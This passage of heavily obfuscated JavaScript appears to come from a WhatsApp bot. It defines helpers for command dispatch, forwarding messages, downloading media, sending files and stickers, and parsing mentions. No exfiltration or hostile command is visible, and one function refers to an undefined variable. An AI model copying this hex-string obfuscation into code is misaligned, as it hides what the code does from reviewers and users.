                        '\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73': _0x471a70,
                        '\x67\x72\x6f\x75\x70\x41\x64\x6d\x69\x6e\x73': _0x2817a6,
                        '\x69\x73\x42\x6f\x74\x41\x64\x6d\x69\x6e\x73': _0x524b64,
                        '\x69\x73\x41\x64\x6d\x69\x6e\x73': _0x554cc9,
                        '\x72\x65\x70\x6c\x79': _0x21c5e4
                    });
                    else _0x44933c['\x6f\x6e'] === _0x71f2ce(0x110) && _0x585fe8[_0x71f2ce('\x30\x78\x32\x36\x65')] === _0x71f2ce('\x30\x78\x32\x36\x38') && _0x44933c[_0x71f2ce(0xdf)](_0x25f52f, _0x585fe8, _0xa7df8d, {
                        '\x66\x72\x6f\x6d': _0x3f69a2,
                        '\x6c': l,
                        '\x71\x75\x6f\x74\x65\x64': _0x5dc601,
                        '\x62\x6f\x64\x79': _0x14f3e6,
                        '\x69\x73\x43\x6d\x64': _0x494d2f,
                        '\x63\x6f\x6d\x6d\x61\x6e\x64': _0x44933c,
                        '\x61\x72\x67\x73': _0x2b2f90,
                        '\x71': _0x1398f4,
                        '\x74\x65\x78\x74': _0x37860e,
                        '\x69\x73\x47\x72\x6f\x75\x70': _0x5b6d29,
                        '\x73\x65\x6e\x64\x65\x72': _0x473af2,
                        '\x73\x65\x6e\x64\x65\x72\x4e\x75\x6d\x62\x65\x72': _0x4a39ba,
                        '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72\x32': _0x49f3aa,
                        '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72': _0xb16346,
                        '\x70\x75\x73\x68\x6e\x61\x6d\x65': _0x157dbf,
                        '\x69\x73\x4d\x65': _0x2d722c,
                        '\x69\x73\x4f\x77\x6e\x65\x72': _0x5bcc99,
                        '\x69\x73\x43\x72\x65\x61\x74\x6f\x72': _0x162b89,
                        '\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61': _0x2940c7,
                        '\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65': _0x3a1a21,
                        '\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73': _0x471a70,
                        '\x67\x72\x6f\x75\x70\x41\x64\x6d\x69\x6e\x73': _0x2817a6,
                        '\x69\x73\x42\x6f\x74\x41\x64\x6d\x69\x6e\x73': _0x524b64,
                        '\x69\x73\x41\x64\x6d\x69\x6e\x73': _0x554cc9,
                        '\x72\x65\x70\x6c\x79': _0x21c5e4
                    });
                }
            }
        });
    }), _0x25f52f[_0x53f6bb(0x1b5)] = _0x4f44e2 => {
        const _0x3afca2 = _0x53f6bb;
        if (!_0x4f44e2) return _0x4f44e2;
        if (/:\d+@/gi [_0x3afca2('\x30\x78\x32\x32\x35')](_0x4f44e2)) {
            let _0x3b67bc = jidDecode(_0x4f44e2) || {};
            return _0x3b67bc[_0x3afca2(0x29b)] && _0x3b67bc[_0x3afca2(0x10c)] && _0x3b67bc['\x75\x73\x65\x72'] + '\x40' + _0x3b67bc[_0x3afca2('\x30\x78\x31\x30\x63')] || _0x4f44e2;
        } else return _0x4f44e2;
    }, _0x25f52f[_0x53f6bb('\x30\x78\x66\x62')] = async (_0x305aa9, _0x3f9c71, _0x4f1d8 = ![], _0x51afc3 = {}) => {
        const _0x49e95d = _0x53f6bb;
        let _0x3148c5;
        _0x51afc3[_0x49e95d(0x12a)] && (_0x3f9c71[_0x49e95d('\x30\x78\x31\x37\x34')] = _0x3f9c71['\x6d\x65\x73\x73\x61\x67\x65'] && _0x3f9c71[_0x49e95d(0x174)]['\x65\x70\x68\x65\x6d\x65\x72\x61\x6c\x4d\x65\x73\x73\x61\x67\x65'] && _0x3f9c71[_0x49e95d('\x30\x78\x31\x37\x34')][_0x49e95d('\x30\x78\x31\x31\x35')][_0x49e95d('\x30\x78\x31\x37\x34')] ? _0x3f9c71[_0x49e95d('\x30\x78\x31\x37\x34')]['\x65\x70\x68\x65\x6d\x65\x72\x61\x6c\x4d\x65\x73\x73\x61\x67\x65'][_0x49e95d(0x174)] : _0x3f9c71[_0x49e95d(0x174)] || undefined, _0x3148c5 = Object['\x6b\x65\x79\x73'](_0x3f9c71[_0x49e95d('\x30\x78\x31\x37\x34')][_0x49e95d(0x23b)][_0x49e95d(0x174)])[0x0], delete(_0x3f9c71[_0x49e95d(0x174)] && _0x3f9c71[_0x49e95d('\x30\x78\x31\x37\x34')][_0x49e95d(0x1c2)] ? _0x3f9c71['\x6d\x65\x73\x73\x61\x67\x65']['\x69\x67\x6e\x6f\x72\x65'] : _0x3f9c71[_0x49e95d(0x174)] || undefined), delete _0x3f9c71[_0x49e95d(0x174)][_0x49e95d('\x30\x78\x32\x33\x62')][_0x49e95d(0x174)][_0x3148c5][_0x49e95d('\x30\x78\x32\x34\x34')], _0x3f9c71[_0x49e95d('\x30\x78\x31\x37\x34')] = {
            ..._0x3f9c71[_0x49e95d(0x174)][_0x49e95d(0x23b)][_0x49e95d('\x30\x78\x31\x37\x34')]
        });
        let _0x1a606f = Object[_0x49e95d('\x30\x78\x31\x33\x65')](_0x3f9c71['\x6d\x65\x73\x73\x61\x67\x65'])[0x0],
            _0x1abce9 = await generateForwardMessageContent(_0x3f9c71, _0x4f1d8),
            _0x5b92d7 = Object[_0x49e95d('\x30\x78\x31\x33\x65')](_0x1abce9)[0x0],
            _0x130a36 = {};
        if (_0x1a606f != '\x63\x6f\x6e\x76\x65\x72\x73\x61\x74\x69\x6f\x6e') _0x130a36 = _0x3f9c71[_0x49e95d('\x30\x78\x31\x37\x34')][_0x1a606f][_0x49e95d('\x30\x78\x31\x32\x34')];
        _0x1abce9[_0x5b92d7][_0x49e95d('\x30\x78\x31\x32\x34')] = {
            ..._0x130a36,
            ..._0x1abce9[_0x5b92d7]['\x63\x6f\x6e\x74\x65\x78\x74\x49\x6e\x66\x6f']
        };
        const _0x546b6e = await generateWAMessageFromContent(_0x305aa9, _0x1abce9, _0x51afc3 ? {
            ..._0x1abce9[_0x5b92d7],
            ..._0x51afc3,
            ..._0x51afc3[_0x49e95d(0x124)] ? {
                '\x63\x6f\x6e\x74\x65\x78\x74\x49\x6e\x66\x6f': {
                    ..._0x1abce9[_0x5b92d7][_0x49e95d('\x30\x78\x31\x32\x34')],
                    ..._0x51afc3[_0x49e95d(0x124)]
                }
            } : {}
        } : {});
        return await _0x25f52f[_0x49e95d('\x30\x78\x32\x37\x31')](_0x305aa9, _0x546b6e['\x6d\x65\x73\x73\x61\x67\x65'], {
            '\x6d\x65\x73\x73\x61\x67\x65\x49\x64': _0x546b6e[_0x49e95d(0xec)]['\x69\x64']
        }), _0x546b6e;
    }, _0x25f52f[_0x53f6bb('\x30\x78\x32\x39\x32')] = async (_0xfc0328, _0x3b8874, _0xd9a843 = !![]) => {
        const _0x5c4571 = _0x53f6bb;
        let _0x1ad560 = _0xfc0328[_0x5c4571(0x1bb)] ? _0xfc0328[_0x5c4571('\x30\x78\x31\x62\x62')] : _0xfc0328,
            _0x2a925f = (_0xfc0328[_0x5c4571('\x30\x78\x31\x62\x62')] || _0xfc0328)['\x6d\x69\x6d\x65\x74\x79\x70\x65'] || '',
            _0x33dba9 = _0xfc0328[_0x5c4571(0x280)] ? _0xfc0328[_0x5c4571(0x280)]['\x72\x65\x70\x6c\x61\x63\x65'](/Message/gi, '') : _0x2a925f[_0x5c4571('\x30\x78\x31\x62\x64')]('\x2f')[0x0];
        const _0x17b201 = await downloadContentFromMessage(_0x1ad560, _0x33dba9);
        let _0x3c4140 = Buffer[_0x5c4571(0x1f8)]([]);
        for await (const _0x2bef89 of _0x17b201) {
            _0x3c4140 = Buffer['\x63\x6f\x6e\x63\x61\x74']([_0x3c4140, _0x2bef89]);
        }
        let _0x170452 = await FileType['\x66\x72\x6f\x6d\x42\x75\x66\x66\x65\x72'](_0x3c4140);
        return trueFileName = _0xd9a843 ? _0x3b8874 + '\x2e' + _0x170452['\x65\x78\x74'] : _0x3b8874, await fs[_0x5c4571(0x241)](trueFileName, _0x3c4140), trueFileName;
    }, _0x25f52f['\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x4d\x65\x64\x69\x61\x4d\x65\x73\x73\x61\x67\x65'] = async _0xe33496 => {
        const _0x537fa3 = _0x53f6bb;
        let _0x371c1c = (_0xe33496[_0x537fa3(0x1bb)] || _0xe33496)[_0x537fa3(0x24a)] || '',
            _0x2d9084 = _0xe33496[_0x537fa3(0x280)] ? _0xe33496[_0x537fa3(0x280)][_0x537fa3('\x30\x78\x31\x38\x39')](/Message/gi, '') : _0x371c1c['\x73\x70\x6c\x69\x74']('\x2f')[0x0];
        const _0x5318e5 = await downloadContentFromMessage(_0xe33496, _0x2d9084);
        let _0x454841 = Buffer[_0x537fa3(0x1f8)]([]);
        for await (const _0x1a90b6 of _0x5318e5) {
            _0x454841 = Buffer[_0x537fa3(0x17a)]([_0x454841, _0x1a90b6]);
        }
        return _0x454841;
    }, _0x25f52f[_0x53f6bb('\x30\x78\x31\x35\x66')] = async (_0x2b8026, _0x1e28f7, _0x14cfcb, _0x27f100, _0x5dd2b2 = {}) => {
        const _0xa4e63 = _0x53f6bb;
        let _0x12a99c = '',
            _0x2ddac7 = await axios[_0xa4e63('\x30\x78\x31\x65\x33')](_0x1e28f7);
        _0x12a99c = _0x2ddac7[_0xa4e63('\x30\x78\x31\x37\x62')][_0xa4e63('\x30\x78\x32\x35\x37')];
        if (_0x12a99c[_0xa4e63(0x1bd)]('\x2f')[0x1] === _0xa4e63(0x25a)) return _0x25f52f['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'](_0x2b8026, {
            '\x76\x69\x64\x65\x6f': await getBuffer(_0x1e28f7),
            '\x63\x61\x70\x74\x69\x6f\x6e': _0x14cfcb,
            '\x67\x69\x66\x50\x6c\x61\x79\x62\x61\x63\x6b': !![],
            ..._0x5dd2b2
        }, {
            '\x71\x75\x6f\x74\x65\x64': _0x27f100,
            ..._0x5dd2b2
        });
        let _0x17974d = _0x12a99c[_0xa4e63('\x30\x78\x31\x62\x64')]('\x2f')[0x0] + '\x4d\x65\x73\x73\x61\x67\x65';
        if (_0x12a99c === '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x70\x64\x66') return _0x25f52f[_0xa4e63(0x139)](_0x2b8026, {
            '\x64\x6f\x63\x75\x6d\x65\x6e\x74': await getBuffer(_0x1e28f7),
            '\x6d\x69\x6d\x65\x74\x79\x70\x65': _0xa4e63('\x30\x78\x31\x35\x31'),
            '\x63\x61\x70\x74\x69\x6f\x6e': _0x14cfcb,
            ..._0x5dd2b2
        }, {
            '\x71\x75\x6f\x74\x65\x64': _0x27f100,
            ..._0x5dd2b2
        });
        if (_0x12a99c[_0xa4e63(0x1bd)]('\x2f')[0x0] === _0xa4e63(0x20d)) return _0x25f52f[_0xa4e63('\x30\x78\x31\x33\x39')](_0x2b8026, {
            '\x69\x6d\x61\x67\x65': await getBuffer(_0x1e28f7),
            '\x63\x61\x70\x74\x69\x6f\x6e': _0x14cfcb,
            ..._0x5dd2b2
        }, {
            '\x71\x75\x6f\x74\x65\x64': _0x27f100,
            ..._0x5dd2b2
        });
        if (_0x12a99c['\x73\x70\x6c\x69\x74']('\x2f')[0x0] === _0xa4e63(0x1de)) return _0x25f52f[_0xa4e63('\x30\x78\x31\x33\x39')](_0x2b8026, {
            '\x76\x69\x64\x65\x6f': await getBuffer(_0x1e28f7),
            '\x63\x61\x70\x74\x69\x6f\x6e': _0x14cfcb,
            '\x6d\x69\x6d\x65\x74\x79\x70\x65': _0xa4e63(0x1fc),
            ..._0x5dd2b2
        }, {
            '\x71\x75\x6f\x74\x65\x64': _0x27f100,
            ..._0x5dd2b2
        });
        if (_0x12a99c[_0xa4e63('\x30\x78\x31\x62\x64')]('\x2f')[0x0] === _0xa4e63(0x1f1)) return _0x25f52f[_0xa4e63('\x30\x78\x31\x33\x39')](_0x2b8026, {
            '\x61\x75\x64\x69\x6f': await getBuffer(_0x1e28f7),
            '\x63\x61\x70\x74\x69\x6f\x6e': _0x14cfcb,
            '\x6d\x69\x6d\x65\x74\x79\x70\x65': _0xa4e63(0x10d),
            ..._0x5dd2b2
        }, {
            '\x71\x75\x6f\x74\x65\x64': _0x27f100,
            ..._0x5dd2b2
        });
    }, _0x25f52f[_0x53f6bb(0x153)] = (_0x20830f, _0x51c08f, _0x22cc1f = '', _0xcaeaeb = _0x25f52f[_0x53f6bb('\x30\x78\x32\x39\x62')]['\x69\x64'], _0x54447f = {}) => {
        const _0x182e68 = _0x53f6bb;
        let _0x2a80fa = Object[_0x182e68('\x30\x78\x31\x33\x65')](_0x51c08f[_0x182e68(0x174)])[0x0],
            _0x3de0fd = _0x2a80fa === _0x182e68('\x30\x78\x31\x31\x35');
        _0x3de0fd && (_0x2a80fa = Object[_0x182e68('\x30\x78\x31\x33\x65')](_0x51c08f['\x6d\x65\x73\x73\x61\x67\x65']['\x65\x70\x68\x65\x6d\x65\x72\x61\x6c\x4d\x65\x73\x73\x61\x67\x65'][_0x182e68(0x174)])[0x0]);
        let _0x537973 = _0x3de0fd ? _0x51c08f[_0x182e68('\x30\x78\x31\x37\x34')]['\x65\x70\x68\x65\x6d\x65\x72\x61\x6c\x4d\x65\x73\x73\x61\x67\x65']['\x6d\x65\x73\x73\x61\x67\x65'] : _0x51c08f[_0x182e68(0x174)],
            _0x3441f8 = _0x537973[_0x2a80fa];
        if (typeof _0x3441f8 === '\x73\x74\x72\x69\x6e\x67') _0x537973[_0x2a80fa] = _0x22cc1f || _0x3441f8;
        else {
            if (_0x3441f8[_0x182e68(0x1c4)]) _0x3441f8['\x63\x61\x70\x74\x69\x6f\x6e'] = _0x22cc1f || _0x3441f8[_0x182e68('\x30\x78\x31\x63\x34')];
            else {
                if (_0x3441f8[_0x182e68(0x290)]) _0x3441f8['\x74\x65\x78\x74'] = _0x22cc1f || _0x3441f8[_0x182e68('\x30\x78\x32\x39\x30')];
            }
        }
        if (typeof _0x3441f8 !== _0x182e68('\x30\x78\x65\x36')) _0x537973[_0x2a80fa] = {
            ..._0x3441f8,
            ..._0x54447f
        };
        if (_0x51c08f[_0x182e68(0xec)][_0x182e68('\x30\x78\x32\x34\x64')]) _0xcaeaeb = _0x51c08f[_0x182e68('\x30\x78\x65\x63')]['\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74'] = _0xcaeaeb || _0x51c08f[_0x182e68('\x30\x78\x65\x63')]['\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74'];
        else {
            if (_0x51c08f[_0x182e68('\x30\x78\x65\x63')][_0x182e68('\x30\x78\x32\x34\x64')]) _0xcaeaeb = _0x51c08f[_0x182e68('\x30\x78\x65\x63')][_0x182e68(0x24d)] = _0xcaeaeb || _0x51c08f['\x6b\x65\x79'][_0x182e68('\x30\x78\x32\x34\x64')];
        }
        if (_0x51c08f['\x6b\x65\x79'][_0x182e68('\x30\x78\x32\x30\x31')]['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x182e68('\x30\x78\x32\x35\x39'))) _0xcaeaeb = _0xcaeaeb || _0x51c08f[_0x182e68('\x30\x78\x65\x63')]['\x72\x65\x6d\x6f\x74\x65\x4a\x69\x64'];
        else {
            if (_0x51c08f[_0x182e68('\x30\x78\x65\x63')]['\x72\x65\x6d\x6f\x74\x65\x4a\x69\x64'][_0x182e68('\x30\x78\x31\x39\x36')](_0x182e68('\x30\x78\x65\x66'))) _0xcaeaeb = _0xcaeaeb || _0x51c08f[_0x182e68('\x30\x78\x65\x63')][_0x182e68('\x30\x78\x32\x30\x31')];
        }
        return _0x51c08f[_0x182e68('\x30\x78\x65\x63')][_0x182e68('\x30\x78\x32\x30\x31')] = _0x20830f, _0x51c08f[_0x182e68(0xec)][_0x182e68('\x30\x78\x32\x37\x61')] = _0xcaeaeb === _0x25f52f[_0x182e68('\x30\x78\x32\x39\x62')]['\x69\x64'], proto['\x57\x65\x62\x4d\x65\x73\x73\x61\x67\x65\x49\x6e\x66\x6f']['\x66\x72\x6f\x6d\x4f\x62\x6a\x65\x63\x74'](_0x51c08f);
    }, _0x25f52f[_0x53f6bb(0x204)] = async (_0x3fac14, _0x1d97a6) => {
        const _0x28cbf4 = _0x53f6bb;
        let _0x45a98d, _0x1f947a = Buffer['\x69\x73\x42\x75\x66\x66\x65\x72'](_0x3fac14) ? _0x3fac14 : /^data:.*?\/.*?;base64,/i [_0x28cbf4(0x225)](_0x3fac14) ? Buffer[_0x28cbf4('\x30\x78\x31\x66\x38')](_0x3fac14[_0x28cbf4('\x30\x78\x31\x62\x64')] `,` [0x1], '\x62\x61\x73\x65\x36\x34') : /^https?:\/\// ['\x74\x65\x73\x74'](_0x3fac14) ? await (_0x45a98d = await getBuffer(_0x3fac14)) : fs[_0x28cbf4('\x30\x78\x31\x37\x66')](_0x3fac14) ? (_0x5cfe51 = _0x3fac14, fs[_0x28cbf4('\x30\x78\x31\x65\x34')](_0x3fac14)) : typeof _0x3fac14 === '\x73\x74\x72\x69\x6e\x67' ? _0x3fac14 : Buffer[_0x28cbf4(0x12d)](0x0),
            _0x1a2402 = await FileType[_0x28cbf4(0x167)](_0x1f947a) || {
                '\x6d\x69\x6d\x65': _0x28cbf4(0x12e),
                '\x65\x78\x74': _0x28cbf4(0xf9)
            },
            _0x5cfe51 = path[_0x28cbf4(0x281)](__filename, __dirname + new Date() * 0x1 + '\x2e' + _0x1a2402[_0x28cbf4(0x15e)]);
        if (_0x1f947a && _0x1d97a6) fs[_0x28cbf4('\x30\x78\x31\x37\x64')][_0x28cbf4('\x30\x78\x31\x36\x35')](_0x5cfe51, _0x1f947a);
        return {
            '\x72\x65\x73': _0x45a98d,
            '\x66\x69\x6c\x65\x6e\x61\x6d\x65': _0x5cfe51,
            '\x73\x69\x7a\x65': await getSizeMedia(_0x1f947a),
            ..._0x1a2402,
            '\x64\x61\x74\x61': _0x1f947a
        };
    }, _0x25f52f[_0x53f6bb('\x30\x78\x31\x61\x62')] = async (_0x38e78b, _0x4bf116, _0x3ac41c, _0xb34103 = {}, _0x53d23e = {}) => {
        const _0xa45ac7 = _0x53f6bb;
        let _0x40e76a = await _0x25f52f[_0xa45ac7(0x204)](_0x4bf116, !![]),
            {
                filename: _0x4f58a2,
                size: _0x4aacb5,
                ext: _0x519b22,
                mime: _0x4546c9,
                data: _0x11496a
            } = _0x40e76a,
            _0x2a8e4b = '',
            _0x50753f = _0x4546c9,
            _0x32557c = _0x4f58a2;
        if (_0x53d23e[_0xa45ac7(0x166)]) _0x2a8e4b = _0xa45ac7(0x198);
        if (_0x53d23e[_0xa45ac7('\x30\x78\x32\x38\x39')] || /webp/ [_0xa45ac7('\x30\x78\x32\x32\x35')](_0x4546c9)) {
            let {
                writeExif: _0x252e87
            } = require('\x2e\x2f\x65\x78\x69\x66\x2e\x6a\x73'), _0x47aa6f = {
                '\x6d\x69\x6d\x65\x74\x79\x70\x65': _0x4546c9,
                '\x64\x61\x74\x61': _0x11496a
            };
            _0x32557c = await _0x252e87(_0x47aa6f, {
                '\x70\x61\x63\x6b\x6e\x61\x6d\x65': Config['\x70\x61\x63\x6b\x6e\x61\x6d\x65'],
                '\x61\x75\x74\x68\x6f\x72': Config[_0xa45ac7(0x1eb)],
                '\x63\x61\x74\x65\x67\x6f\x72\x69\x65\x73': _0x53d23e[_0xa45ac7('\x30\x78\x32\x31\x65')] ? _0x53d23e['\x63\x61\x74\x65\x67\x6f\x72\x69\x65\x73'] : []
            }), await fs[_0xa45ac7('\x30\x78\x31\x37\x64')][_0xa45ac7(0x20c)](_0x4f58a2), _0x2a8e4b = _0xa45ac7('\x30\x78\x31\x31\x30'), _0x50753f = _0xa45ac7(0x176);
        } else {
            if (/image/ [_0xa45ac7('\x30\x78\x32\x32\x35')](_0x4546c9)) _0x2a8e4b = '\x69\x6d\x61\x67\x65';
            else {
                if (/video/ [_0xa45ac7(0x225)](_0x4546c9)) _0x2a8e4b = _0xa45ac7(0x1de);
                else {
                    if (/audio/ [_0xa45ac7(0x225)](_0x4546c9)) _0x2a8e4b = _0xa45ac7('\x30\x78\x31\x66\x31');
                    else _0x2a8e4b = _0xa45ac7(0x198);
                }
            }
        }
        return await _0x25f52f[_0xa45ac7('\x30\x78\x31\x33\x39')](_0x38e78b, {
            [_0x2a8e4b]: {
                '\x75\x72\x6c': _0x32557c
            },
            '\x6d\x69\x6d\x65\x74\x79\x70\x65': _0x50753f,
            '\x66\x69\x6c\x65\x4e\x61\x6d\x65': _0x3ac41c,
            ..._0x53d23e
        }, {
            '\x71\x75\x6f\x74\x65\x64': _0xb34103,
            ..._0x53d23e
        }), fs[_0xa45ac7('\x30\x78\x31\x37\x64')]['\x75\x6e\x6c\x69\x6e\x6b'](_0x32557c);
    }, _0x25f52f[_0x53f6bb('\x30\x78\x31\x31\x32')] = async _0x3bfac0 => {
        const _0x3aea88 = _0x53f6bb;
        return [..._0x3bfac0[_0x3aea88('\x30\x78\x32\x33\x61')](/@([0-9]{5,16}|0)/g)][_0x3aea88('\x30\x78\x31\x33\x38')](_0x21a2ca => _0x21a2ca[0x1] + _0x3aea88(0x259));
    }, _0x25f52f[_0x53f6bb(0x21b)] = async (_0x4a1553, _0x49d37d, _0x5b058f = '', _0x3df9c2 = '', _0x4fa3ec = '', _0x440bc5 = {}) => {
        const _0x5bcaf1 = _0x53f6bb;
        let _0x5222a1 = await _0x25f52f[_0x5bcaf1(0x204)](_0x49d37d, !![]),
            {
                mime: _0x514067,
                ext: _0xb8640b,
                res: _0x3c370f,
                data: _0x11f17a,
                filename: _0x4fb6e4
            } = _0x5222a1;
        if (_0x3c370f && _0x3c370f[_0x5bcaf1(0x156)] !== 0xc8 || file[_0x5bcaf1('\x30\x78\x31\x63\x35')] <= 0x10000) try {
            throw {
                '\x6a\x73\x6f\x6e': JSON[_0x5bcaf1(0x27c)](file[_0x5bcaf1(0xf3)]())
            };
        } catch (_0x364d89) {
            if (_0x364d89[_0x5bcaf1(0x13c)]) throw _0x364d89[_0x5bcaf1('\x30\x78\x31\x33\x63')];
        }
        let _0x1ef632 = '',
            _0x51e3c3 = _0x514067,
            _0x2a1f4e = _0x4fb6e4;
        if (_0x440bc5['\x61\x73\x44\x6f\x63\x75\x6d\x65\x6e\x74']) _0x1ef632 = _0x5bcaf1(0x198);
        if (_0x440bc5[_0x5bcaf1(0x289)] || /webp/ [_0x5bcaf1(0x225)](_0x514067)) {
            let {
                writeExif: _0x4264bb
            } = require('\x2e\x2f\x65\x78\x69\x66'), _0x30c16c = {
                '\x6d\x69\x6d\x65\x74\x79\x70\x65': _0x514067,
                '\x64\x61\x74\x61': _0x11f17a
            };
            _0x2a1f4e = await _0x4264bb(_0x30c16c, {
                '\x70\x61\x63\x6b\x6e\x61\x6d\x65': _0x440bc5[_0x5bcaf1('\x30\x78\x31\x65\x62')] ? _0x440bc5[_0x5bcaf1(0x1eb)] : Config[_0x5bcaf1('\x30\x78\x31\x65\x62')],
                '\x61\x75\x74\x68\x6f\x72': _0x440bc5[_0x5bcaf1(0x18a)] ? _0x440bc5[_0x5bcaf1('\x30\x78\x31\x38\x61')] : Config['\x61\x75\x74\x68\x6f\x72'],
                '\x63\x61\x74\x65\x67\x6f\x72\x69\x65\x73': _0x440bc5[_0x5bcaf1('\x30\x78\x32\x31\x65')] ? _0x440bc5[_0x5bcaf1('\x30\x78\x32\x31\x65')] : []
            }), await fs[_0x5bcaf1(0x17d)]['\x75\x6e\x6c\x69\x6e\x6b'](_0x4fb6e4), _0x1ef632 = '\x73\x74\x69\x63\x6b\x65\x72', _0x51e3c3 = _0x5bcaf1(0x176);
        } else {
            if (/image/ [_0x5bcaf1(0x225)](_0x514067)) _0x1ef632 = '\x69\x6d\x61\x67\x65';
            else {
                if (/video/ [_0x5bcaf1('\x30\x78\x32\x32\x35')](_0x514067)) _0x1ef632 = _0x5bcaf1('\x30\x78\x31\x64\x65');
                else {
                    if (/audio/ [_0x5bcaf1('\x30\x78\x32\x32\x35')](_0x514067)) _0x1ef632 = _0x5bcaf1('\x30\x78\x31\x66\x31');
                    else _0x1ef632 = _0x5bcaf1('\x30\x78\x31\x39\x38');
                }
            }
        }
        return await _0x25f52f[_0x5bcaf1(0x139)](_0x4a1553, {
            [_0x1ef632]: {
                '\x75\x72\x6c': _0x2a1f4e
            },
            '\x63\x61\x70\x74\x69\x6f\x6e': _0x3df9c2,
            '\x6d\x69\x6d\x65\x74\x79\x70\x65': _0x51e3c3,
            '\x66\x69\x6c\x65\x4e\x61\x6d\x65': _0x5b058f,
            ..._0x440bc5
        }, {
            '\x71\x75\x6f\x74\x65\x64': _0x4fa3ec,
            ..._0x440bc5
        }), fs[_0x5bcaf1(0x17d)][_0x5bcaf1('\x30\x78\x32\x30\x63')](_0x2a1f4e);
    }, _0x25f52f[_0x53f6bb(0x1e7)] = async (_0x5563b7, _0x502eb1, _0x35c617 = {}) => {
        const _0x207878 = _0x53f6bb;
        let _0x5893c7;
        _0x35c617 && (_0x35c617[_0x207878('\x30\x78\x31\x65\x62')] || _0x35c617[_0x207878('\x30\x78\x31\x38\x61')]) ? _0x5893c7 = await writeExifVid(_0x502eb1, _0x35c617) : _0x5893c7 = await videoToWebp(_0x502eb1), await _0x25f52f[_0x207878(0x139)](_0x5563b7, {
            '\x73\x74\x69\x63\x6b\x65\x72': {
                '\x75\x72\x6c': _0x5893c7
            },
            ..._0x35c617
        }, _0x35c617);
    }, _0x25f52f[_0x53f6bb(0x16a)] = async (_0x5068be, _0x492283, _0x2f00be = {}) => {
        const _0x4ef20e = _0x53f6bb;
        let _0x47e21d;
        _0x2f00be && (_0x2f00be[_0x4ef20e('\x30\x78\x31\x65\x62')] || _0x2f00be['\x61\x75\x74\x68\x6f\x72']) ? _0x47e21d = await writeExifImg(_0x492283, _0x2f00be) : _0x47e21d = await imageToWebp(_0x492283), await _0x25f52f['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'](_0x5068be, {
            '\x73\x74\x69\x63\x6b\x65\x72': {
                '\x75\x72\x6c': _0x47e21d
            },
            ..._0x2f00be
        }, _0x2f00be);
    }, _0x25f52f[_0x53f6bb('\x30\x78\x31\x34\x39')] = async (_0x111b65, _0x5e9b1c, _0xd5ef3c, _0xda175f = {}) => _0x25f52f[_0x53f6bb(0x139)](_0x111b65, {
        '\x74\x65\x78\x74': _0x5e9b1c,
        '\x63\x6f\x6e\x74\x65\x78\x74\x49\x6e\x66\x6f': {
            '\x6d\x65\x6e\x74\x69\x6f\x6e\x65\x64\x4a\x69\x64': [..._0x5e9b1c[_0x53f6bb('\x30\x78\x32\x33\x61')](/@(\d{0,16})/g)][_0x53f6bb(0x138)](_0x3ead3a => _0x3ead3a[0x1] + _0x53f6bb('\x30\x78\x32\x35\x39'))
        },
        ..._0xda175f
    }, {
        '\x71\x75\x6f\x74\x65\x64': _0xd5ef3c
    }), _0x25f52f[_0x53f6bb('\x30\x78\x32\x31\x31')] = async (_0x25dd55, _0x1104a0, _0x5ee727 = '', _0x45ed73 = '', _0x48977e) => {
        const _0x3defb6 = _0x53f6bb;
        let _0x5e83fa = Buffer[_0x3defb6(0x142)](_0x1104a0) ? _0x1104a0 : /^data:.*?\/.*?;base64,/i [_0x3defb6(0x225)](_0x1104a0) ? Buffer['\x66\x72\x6f\x6d'](_0x1104a0[_0x3defb6(0x1bd)] `,` [0x1], _0x3defb6(0x285)) : /^https?:\/\// [_0x3defb6('\x30\x78\x32\x32\x35')](_0x1104a0) ? await await getBuffer(_0x1104a0) : fs[_0x3defb6('\x30\x78\x31\x37\x66')](_0x1104a0) ? fs[_0x3defb6(0x1e4)](_0x1104a0) : Buffer['\x61\x6c\x6c\x6f\x63'](0x0);
        return await _0x25f52f[_0x3defb6('\x30\x78\x31\x33\x39')](_0x25dd55, {
            '\x69\x6d\x61\x67\x65': _0x5e83fa,
            '\x63\x61\x70\x74\x69\x6f\x6e': _0x5ee727,
            ..._0x48977e
        }, {
            '\x71\x75\x6f\x74\x65\x64': _0x45ed73
        });
    }, _0x25f52f[_0x53f6bb('\x30\x78\x31\x36\x34')] = (_0x25bb92, _0x3b3b2b, _0xb5330b = '', _0x88d2da) => _0x25f52f[_0x53f6bb(0x139)](_0x25bb92, {
        '\x74\x65\x78\x74': _0x3b3b2b,
        ..._0x88d2da
    }, {
        '\x71\x75\x6f\x74\x65\x64': _0xb5330b
    }), _0x25f52f[_0x53f6bb(0x16e)] = (_0x1b3e9c, _0x2c5772 = [], _0x39835f, _0x1030bd, _0x4ef7ed = '', _0x1a3526 = {}) => {
        let _0x240d44 = {
            '\x74\x65\x78\x74': _0x39835f,
            '\x66\x6f\x6f\x74\x65\x72': _0x1030bd,
            '\x62\x75\x74\x74\x6f\x6e\x73': _0x2c5772,
            '\x68\x65\x61\x64\x65\x72\x54\x79\x70\x65': 0x2,
            ..._0x1a3526
        };
        _0x25f52f['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'](_0x1b3e9c, _0x240d44, {
            '\x71\x75\x6f\x74\x65\x64': _0x4ef7ed,
            ..._0x1a3526
        });
    }, _0x25f52f[_0x53f6bb('\x30\x78\x31\x33\x35')] = async (_0x468d8a, _0x3b9472 = '', _0xb77bad = '', _0x2a8371, _0x510ba8 = [], _0x3fc906, _0x27ddc0 = {}) => {
        const _0x36da37 = _0x53f6bb;
        let _0xf8d3b2 = await prepareWAMessageMedia({
            '\x69\x6d\x61\x67\x65': _0x2a8371,
            '\x6a\x70\x65\x67\x54\x68\x75\x6d\x62\x6e\x61\x69\x6c': _0x3fc906
        }, {
